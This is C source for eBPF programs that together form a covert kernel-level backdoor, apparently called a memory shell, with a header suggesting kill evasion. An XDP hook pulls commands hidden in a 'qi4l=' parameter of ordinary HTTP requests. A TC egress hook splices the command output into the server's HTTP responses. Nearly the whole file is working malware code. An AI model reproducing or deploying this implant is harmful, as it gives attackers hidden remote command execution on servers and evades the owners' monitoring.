#include "vmlinux.h"
#include "../bpf/bpf_helpers.h"
#include "../bpf/bpf_core_read.h"
#include "../bpf/bpf_endian.h"

#include "debug.h"
#include "event.h"
#include "memoryShell.h"
#include "avoidKill.h"

char LICENSE[] SEC("license") = "Dual MIT/GPL";

SEC("tc")
int tcEgress(struct __sk_buff *ctx) {
    u32 zero = 0;
    u32 *nextSeq;
    nextSeq = bpf_map_lookup_elem(&seqMap, &zero);

    //not receive cmd
    if (nextSeq == 0) {
        return TC_ACT_OK;
    }


    //bpf_skb_load_bytes
    void *data = (void *) (u64) ctx->data;
    void *dataEnd = (void *) (u64) ctx->data_end;


    // Parse Ethernet header
    struct ethhdr *eth = data;
    if (data + sizeof(struct ethhdr) > dataEnd)
        return TC_ACT_OK;

    if (bpf_ntohs(eth->h_proto) != ETH_P_IP)
        return TC_ACT_OK;

    // Parse IP header
    // Return the protocol of this packet
    // 1 = ICMP
    // 6 = TCP
    // 17 = UDP
    struct iphdr *iph = data + sizeof(struct ethhdr);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) > dataEnd)
        return TC_ACT_OK;


    // Check if the packet is TCP
    if (iph->protocol != IPPROTO_TCP)
        return TC_ACT_OK;

    // Parse TCP header
    struct tcphdr *tcp = (void *) iph + sizeof(*iph);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr) > dataEnd)
        return TC_ACT_OK;


    u32 tcp_header_size = tcp->doff * 4;
    u8 *httpDataStart = (void *) tcp + tcp_header_size;
    u8 *httpDataEnd = (u8 *) dataEnd;


    // Check for HTTP payload
    // This is a very basic check for HTTP traffic
    if (httpDataStart + 1 > httpDataEnd)
        return TC_ACT_OK;


    //Determine if the response corresponding to the command request is carried
    if (bpf_ntohl(tcp->ack_seq) != *nextSeq) {
        //DEBUG_PRINT("no");
        return TC_ACT_OK;
    }

    //Consider that the http response is transmitted twice, once in the response header and once in the response body.
    //What should I do if the http response don't have a body????????????????????????????????????????????

    httpResCount++;
    u32 httpDataLength = httpDataEnd - httpDataStart;
    if (httpResCount == 1) {


        return TC_ACT_OK;
    }


    //httpResCount==2
    u8 *cmdResPtr = 0;
    cmdResPtr = bpf_map_lookup_elem(&cmdResMap, &zero);
    if (cmdResPtr == 0) {
        DEBUG_PRINT("don't find the cmd!!!");
    }
    u32 baseOffset = sizeof(struct ethhdr) + sizeof(struct iphdr) + tcp_header_size;
    //DEBUG_PRINT("response body len:%d", httpDataLength);
    u32 numAdd = MAX_CMD_RES_LEN - httpDataLength % MAX_CMD_RES_LEN;
    //DEBUG_PRINT("numadd:%u",numAdd);
    s64 ret = bpf_skb_change_tail(ctx, baseOffset + httpDataLength + numAdd, 0);

    if (ret != 0)
        DEBUG_PRINT("bpf_skb_change_tail error:%d", ret);


    /////////////////////////////////
    for (int i = 0; i < 16 * 4; ++i) {
        u8 localCmdRes[MAX_CMD_RES_LEN];
        __builtin_memset(localCmdRes, '\x00', MAX_CMD_RES_LEN);
        //include \x00,so +1
        s64 ret = bpf_probe_read_kernel_str(localCmdRes, MAX_CMD_RES_LEN + 1, cmdResPtr + i * (MAX_CMD_RES_LEN));
        if (ret < 0) {
            DEBUG_PRINT("bpf_probe_read_user_str error,%d", ret);
        }

        ret = bpf_skb_store_bytes(ctx,
                                  baseOffset +
                                  i * (MAX_CMD_RES_LEN),
                                  &localCmdRes,
                                  MAX_CMD_RES_LEN,
                                  BPF_F_RECOMPUTE_CSUM);
        //DEBUG_PRINT("%s",httpDataStart);
        if (ret != 0) {
            break;

        }
    }

    bpf_map_delete_elem(&cmdResMap, &zero);
    bpf_map_delete_elem(&seqMap, &zero);
    httpResCount = 0;


    return TC_ACT_OK;
}

//xdp
//Ingress only
SEC("xdp")
int xdpHttpParser(struct xdp_md *ctx) {
    void *data = (void *) (u64) ctx->data;

    void *dataEnd = (void *) (u64) ctx->data_end;

    // Parse Ethernet header
    struct ethhdr *eth = data;
    if (data + sizeof(struct ethhdr) > dataEnd)
        return XDP_ABORTED;

    if (bpf_ntohs(eth->h_proto) != ETH_P_IP)
        return XDP_PASS;

    // Parse IP header
    // Return the protocol of this packet
    // 1 = ICMP
    // 6 = TCP
    // 17 = UDP
    struct iphdr *iph = data + sizeof(struct ethhdr);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) > dataEnd)
        return XDP_ABORTED;


    // Check if the packet is TCP
    if (iph->protocol != IPPROTO_TCP)
        return XDP_PASS;

    // Parse TCP header
    struct tcphdr *tcp = (void *) iph + sizeof(*iph);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr) > dataEnd)
        return XDP_ABORTED;



    // Calculate TCP payload (HTTP data)

    u32 tcp_header_size = tcp->doff * 4;

    u8 *httpDataStart = (void *) tcp + tcp_header_size;
    u8 *httpDataEnd = (u8 *) dataEnd;


    // Check for HTTP payload
    // This is a very basic check for HTTP traffic
    if (httpDataStart + 4 > httpDataEnd)
        return XDP_PASS;

    //GET or POST
    //https???
    if (!(httpDataStart[0] == 'G' && httpDataStart[1] == 'E' && httpDataStart[2] == 'T') &&
        !(httpDataStart[0] == 'P' && httpDataStart[1] == 'O' && httpDataStart[2] == 'S' && httpDataStart[3] == 'T')) {
        return XDP_PASS;
    }
    //DEBUG_PRINT("xdp");
    // HTTP traffic identified
    u8 httpData[MAX_HTTP_LEN];


    //bpf_core_read_str(&httpData, sizeof(httpData), httpDataStart);
    bpf_core_read_str(&httpData, sizeof(httpData), httpDataStart + 5);
    //DEBUG_PRINT("receive http:\n\n%s", httpDataStart);
    //DEBUG_PRINT("receive http:\n\n%s", httpData);
    //s32 httpLength = (s32) (httpDataEnd - httpDataStart);


    u8 line[MAX_HTTP_LINE_LEN];
    __builtin_memset(line, '\x00', MAX_HTTP_LINE_LEN);
    //first line
    for (s32 rightIndex = 0; rightIndex < MAX_HTTP_LEN; ++rightIndex) {
        //DEBUG_PRINT("%c",httpData[rightIndex]);
        if (httpData[rightIndex] == '\r' && rightIndex - 9 >= 0) {
            //__builtin_memset(httpLine->line+rightIndex-1,'\x00',sizeof(httpLine->line)-rightIndex+1);
            //httpLine->line[rightIndex-1] = '\x00';
            //DEBUG_PRINT("%d",httpData[rightIndex-9]);
            httpData[rightIndex - 9] = '\x00';
            bpf_core_read_str(&line, sizeof(line), &httpData);
            //bpf_core_read_str(&httpLine->line, sizeof(httpLine->line), &httpData);
            break;
        }
    }
    //DEBUG_PRINT("%s",httpLine->line);
    //find feng
    for (s32 i = 0; i + 5 < MAX_HTTP_LINE_LEN; ++i) {
        if (line[i] == 'q' &&
            line[i + 1] == 'i' &&
            line[i + 2] == '4' &&
            line[i + 3] == 'l' &&
            line[i + 4] == '=') {
            //bpf_core_read_str(&httpCmd->cmd,sizeof(httpCmd->cmd),line+i+5);
            //后续内核态怎么处理CMD?
            u32 httpLen = httpDataEnd - httpDataStart;
            u32 zero = 0;
            u32 nextSeq = bpf_htonl(tcp->seq) + httpLen;

            //
            u32 *nextSeqPtr = bpf_map_lookup_elem(&seqMap, &zero);
            u8 *cmdRes = bpf_map_lookup_elem(&cmdResMap, &zero);
            if (cmdRes != 0 && nextSeqPtr != 0 && *nextSeqPtr == nextSeq) {
                //DEBUG_PRINT("bpf_ringbuf_discard:%s",httpCmd->cmd);
                //bpf_ringbuf_discard(httpCmd,0);
                //bpf_map_delete_elem(&seqMap,&zero);
                return XDP_PASS;
            }
            //first receive
            if (nextSeqPtr == 0) {
                struct httpCmd *httpCmd;
                httpCmd = bpf_ringbuf_reserve(&rb, sizeof(*httpCmd), 0);
                if (!httpCmd)
                    return XDP_PASS;
                httpCmd->type = 1;
                bpf_core_read_str(&httpCmd->cmd, sizeof(httpCmd->cmd), line + i + 5);
                bpf_map_update_elem(&seqMap, &zero, &nextSeq, BPF_ANY);
                //DEBUG_PRINT("seq:%u,httpLen:%u,nextSeq:%u", bpf_htonl(tcp->seq),httpLen,nextSeq);
                bpf_ringbuf_submit(httpCmd, 0);
                return XDP_TX;
            }

            return XDP_TX;

        }
    }

    return XDP_PASS;
}

